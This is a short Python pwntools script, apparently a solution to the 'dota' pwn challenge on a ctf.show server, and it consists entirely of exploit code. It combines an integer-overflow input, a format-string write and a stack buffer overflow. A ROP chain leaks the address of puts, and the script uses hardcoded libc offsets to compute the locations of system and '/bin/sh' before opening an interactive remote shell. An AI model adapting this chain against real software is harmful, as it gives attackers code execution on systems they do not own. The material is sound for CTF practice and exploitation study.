from pwn import *
p=remote('pwn.challenge.ctf.show',28010)
elf=ELF('./dota')
blood=0x400812
rdi=0x4009b3
ret=0x4005ce
blood=0x400737
p.sendline('dota')
sleep(0.1)
p.sendline('2147483648')
p.recvuntil('dota1中英雄最高等级为多少？\n')
addr=int(p.recvline()[:-1],16)
payload1=b'a'*25+b'%12$naa'+p64(addr)
p.sendline(payload1)
p.recv()
payload2=b'a'*(0x80+8)+p64(rdi)+p64(elf.got['puts'])
payload2+=p64(elf.plt['puts'])+p64(blood)
p.sendline(payload2)
p.recvline()
puts_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts_addr))
#------
sys=0x04f440
sh=0x1b3e9a
puts=0x0809c0
offset=puts_addr-puts
system=sys+offset
binsh=sh+offset
#------
p.recvuntil('dota1中英雄最高等级为多少？\n')
addr=int(p.recvline()[:-1],16)
payload1=b'a'*25+b'%12$naa'+p64(addr)
p.sendline(payload1)
payload2=b'a'*(0x80+8)+p64(rdi)+p64(binsh)
payload2+=p64(ret)+p64(system)
p.sendline(payload2)
p.interactive()
